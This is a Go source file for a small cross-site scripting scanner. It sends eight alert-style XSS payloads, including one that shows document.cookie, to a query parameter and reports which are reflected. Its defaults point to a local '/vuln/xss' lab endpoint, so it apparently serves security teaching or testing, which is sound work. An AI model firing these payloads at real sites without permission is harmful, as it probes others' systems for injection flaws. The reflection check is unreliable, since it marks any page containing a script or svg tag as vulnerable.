package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Payload struct {
	Name        string
	Description string
	Value       string
}

var payloads = []Payload{
	{
		Name:        "Basic Alert",
		Description: "Simple alert box",
		Value:       `<script>alert('XSS')</script>`,
	},
	{
		Name:        "Image Error",
		Description: "Uses img onerror event",
		Value:       `<img src=x onerror=alert('XSS')>`,
	},
	{
		Name:        "SVG Payload",
		Description: "SVG onload event",
		Value:       `<svg onload=alert('XSS')>`,
	},
	{
		Name:        "Cookie Stealer",
		Description: "Attempts to read cookies",
		Value:       `<script>alert(document.cookie)</script>`,
	},
	{
		Name:        "Input Break",
		Description: "Breaks out of input attribute",
		Value:       `"><script>alert('XSS')</script>`,
	},
	{
		Name:        "JavaScript URL",
		Description: "Uses javascript: protocol",
		Value:       `javascript:alert('XSS')`,
	},
	{
		Name:        "Event Handler",
		Description: "Uses onmouseover event",
		Value:       `<div onmouseover=alert('XSS')>hover me</div>`,
	},
	{
		Name:        "Encoded Payload",
		Description: "HTML encoded script tag",
		Value:       `&lt;script&gt;alert('XSS')&lt;/script&gt;`,
	},
}

type Result struct {
	Payload   Payload
	URL       string
	Reflected bool
	Status    int
	Elapsed   time.Duration
}

func test(target, path string, payload Payload) Result {
	start := time.Now()

	fullURL := fmt.Sprintf("%s%s?name=%s", target, path, url.QueryEscape(payload.Value))

	resp, err := http.Get(fullURL)
	elapsed := time.Since(start)

	if err != nil {
		return Result{
			Payload:   payload,
			URL:       fullURL,
			Reflected: false,
			Elapsed:   elapsed,
		}
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// check multiple indicators of reflection
	reflected := false

	// check for script tags
	if strings.Contains(bodyStr, "<script>") {
		reflected = true
	}
	// check for event handlers
	if strings.Contains(bodyStr, "onerror=") ||
		strings.Contains(bodyStr, "onload=") ||
		strings.Contains(bodyStr, "onmouseover=") {
		reflected = true
	}
	// check for unescaped angle brackets with script content
	if strings.Contains(bodyStr, "<img src=x") {
		reflected = true
	}
	// check for svg payload
	if strings.Contains(bodyStr, "<svg") {
		reflected = true
	}
	// check raw payload
	if strings.Contains(bodyStr, payload.Value) {
		reflected = true
	}

	return Result{
		Payload:   payload,
		URL:       fullURL,
		Reflected: reflected,
		Status:    resp.StatusCode,
		Elapsed:   elapsed,
	}
}

func main() {
	target := flag.String("target", "http://localhost:9090", "target server URL")
	path := flag.String("path", "/vuln/xss", "vulnerable path to test")
	flag.Parse()

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("        DELTA XSS SCANNER")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("  Target : %s%s\n", *target, *path)
	fmt.Printf("  Payloads: %d\n", len(payloads))
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	vulnerable := 0
	safe := 0

	for _, payload := range payloads {
		result := test(*target, *path, payload)

		if result.Reflected {
			vulnerable++
			fmt.Printf("  [VULNERABLE] %s\n", payload.Name)
			fmt.Printf("               %s\n", payload.Description)
			fmt.Printf("               payload=%s\n\n", payload.Value)
		} else {
			safe++
			fmt.Printf("  [SAFE] %s → not reflected\n", payload.Name)
		}
	}

	fmt.Println("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("        SCAN SUMMARY")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("  Vulnerable : %d\n", vulnerable)
	fmt.Printf("  Safe       : %d\n", safe)
	fmt.Printf("  Total      : %d\n", len(payloads))
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	if vulnerable > 0 {
		fmt.Println("\n  ⚠️  XSS vulnerabilities detected!")
		fmt.Printf("  Test the secure version: %s/secure/xss\n", *target)
	} else {
		fmt.Println("\n  ✓ No XSS vulnerabilities detected.")
	}
}
